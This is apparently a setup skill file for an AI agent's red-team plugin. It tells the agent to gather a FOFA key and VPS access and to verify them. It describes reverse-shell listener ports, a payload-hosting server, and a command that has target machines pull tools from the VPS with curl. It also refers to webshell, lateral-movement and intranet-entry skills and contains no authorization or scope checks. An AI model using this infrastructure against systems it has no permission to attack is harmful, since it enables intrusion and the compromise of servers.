---
name: redteam-setup
description: First-time setup guide: guide the user to provide FOFA_KEY and VPS login method, verify channel availability, and explain fallback posture (toolchain is obtained on demand from the toolkit package)
whenToUse: When the user uses red-team mode for the first time; or redteam_preflight reports onboarding.incomplete / broken skills; or the user says "environment not configured" / "install tools"
role: plan
enabled: true
---

# First-time setup guide (configure the environment once)

**Trigger conditions** (execute this skill if any is met; do not skip):
- `redteam_preflight` returns `onboarding.complete=false`;
- preflight has `broken` skills due to "missing environment variables" or "VPS still placeholder";
- user is entering red-team mode for the first time, or explicitly says "environment/tools not configured".

**Core principle**: **say everything at once, ask for everything at once**. Do not ask piecemeal—that is the only reason this guide exists.

## 1. First confirm whether you have the "toolkit" (npm version does not include it by default)

The npm version of `dsh-redteam-mode` **does not ship tool installation scripts or the 9 attack-chain skills** (tunnel / credentials /
webshell / reverse shell / lateral movement / unauthorized exploitation). Reason: npm's automated publish review treats
"package automatically downloads penetration binaries after install" as malicious behavior, and the package may be blocked.

- **If** `$DSH_HOME/redteam/setup.sh` exists (toolkit obtained manually, or non-npm install) → follow sections 2 and 3 below;
- **If not** (`redteam_preflight` returns `onboarding.setup_script.exists=false`) → first download
  `dsh-redteam-mode-<version>-toolkit.tar.gz` from the project's GitHub Release, extract it and follow its README
  **executed by the user**, then manually configure `FOFA_KEY` and VPS in section 3;
- **Neither is fine too**: you can start with the 14 reconnaissance/detection skills included in this package (`fofa-recon` / `active-scan` /
  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce`, etc.), but you will not be able to achieve results requiring persistence/landing.

> **Red line**: this plugin **does not download or install any security tools for the user**. State what is needed and where to obtain it; the user obtains and runs it themselves.

## 2. What to ask the user for (ask once, explain "why" and "where it goes")

| What | Why required | Where to provide | What happens without it |
| --- | --- | --- | --- |
| **FOFA_KEY** | Asset mapping (`fofa-recon`) depends on it to expand the organization's internet asset surface; without it you can only rely on crt.sh + subdomain enumeration, and **edge/unregistered assets will be missed significantly** | Environment variable `FOFA_KEY`, or write to `$DSH_HOME/.env` (script can write it) | Mapping capability degrades: incomplete asset discovery → all four later phases affected |
| **VPS login method** (`user@ip` + private key path) | Reverse shells must land on a **publicly controllable host**; payload delivery and tunnel relay also depend on it | `REDTEAM_VPS_HOST` (`user@host`) / `REDTEAM_VPS_KEY` (private key path, default `$DSH_HOME/redteam/toolkit/vps/id_rsa`) | Cannot obtain server access, cannot deliver payloads, cannot enter intranet |
| (Optional) mapping platform keys | Quake / Hunter / ZoomEye differ from FOFA results; cross-checking can find more assets | Environment variables as needed | One less cross-validation path |
| (Optional) permission to install via apt | To add system tools | User runs `sudo apt install …` themselves | Related skills degrade |

**Communication requirement**: after listing everything, **wait for the user to provide it**. Do not gloss over with "I'll start with a degraded approach"—unless the user explicitly says "work with current conditions".

**Note**: the user's keys **must not be written into the repository, pasted into reports, or appear in the `tool` field of `redteam_chain_add`**.
Writing them into `$DSH_HOME/.env` is sufficient (script sets `chmod 600`).

### How to get FOFA_KEY (be able to guide the user)
1. Log in to <https://fofa.info> → avatar (top right) → **Personal Center → API Key**;
2. Personal plan limits: 10,000 queries/month, 1 request/sec concurrency (**scripts and skills all rate-limit to 1 req/sec; do not increase it**, exceeding triggers 45012 ban);
3. After obtaining, self-test: `curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` — `"error":false` means valid.

### How to prepare VPS (be able to guide the user)
- A **publicly reachable** Linux VPS (1 core / 1 GB is enough), with security group allowing: `22` (SSH), `9000-9999` (reverse shell listener range), `9100` (payload distribution);
- Generate/place SSH private key at `$DSH_HOME/redteam/toolkit/vps/id_rsa` with permissions `chmod 600`;
- Verify connectivity: `ssh -i <key> <user>@<ip> 'echo ok'`;
- **Payload distribution service**: `~/payload` directory on VPS + `python3 -m http.server 9100` (persistent in tmux),
  so target can pull tools directly with `curl http://<ip>:9100/fscan`.

## 3. Verification after configuration (must be completed before setup is considered successful)

Test each item; **do not rely on "file exists" only**:

```bash
# 1) FOFA key valid
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS reachable (payload service liveness is checked by toolkit health script)
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'

# 3) Skill registry visible
#    Recheck with redteam_preflight to see which skills are actually available
```

> Health checks for tool binaries and nuclei template library are handled by `redteam-setup.sh --check` in the toolkit
> (not included in npm version; see section 1).

## 4. Final step: write completion marker and recheck

After configuration is complete, write the completion marker (toolkit script does this automatically with `--yes`; if not available, write manually):

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

Then **run `redteam_preflight` again** to confirm: `onboarding.complete=true`, and `broken` is empty or contains only items the user explicitly accepted as degraded.
Report the final conclusion to the user in three points: "what works / what is missing / what impact the missing parts have".

**After modifying `$DSH_HOME/.env`, dsh web must be restarted**, otherwise the current process will not read new environment variables—
you must clearly tell the user this (the agent cannot restart it for them).

## 5. When the user refuses to provide some resources (fallback posture)

| Missing | Fallback approach | Limitation you must explain to the user |
| --- | --- | --- |
| FOFA_KEY | crt.sh certificate transparency + `passive-recon` + `recon-pipeline` (subfinder/ksubdomain/dnsx) + search engines and registration info | **Incomplete asset collection**; unregistered/edge assets will be missed; scoring ceiling affected |
| VPS | Only pursue results that do not require persistence (account access, data, unauthorized access, webshell delivery) | **Cannot obtain server access, cannot enter intranet**; `boundary`/`internal`/`central-system` scoring points largely unavailable |
| System tools (nuclei etc.) | Use alternatives in toolkit (httpx/subfinder still available) | Vulnerability discovery capability significantly reduced; N-day detection largely impaired |
| Everything missing | Only passive reconnaissance and asset triage | Clearly tell the user "this run can only reach the reconnaissance phase" |

**Record degradation decisions in the report**: the user needs to know under what conditions this run was conducted.
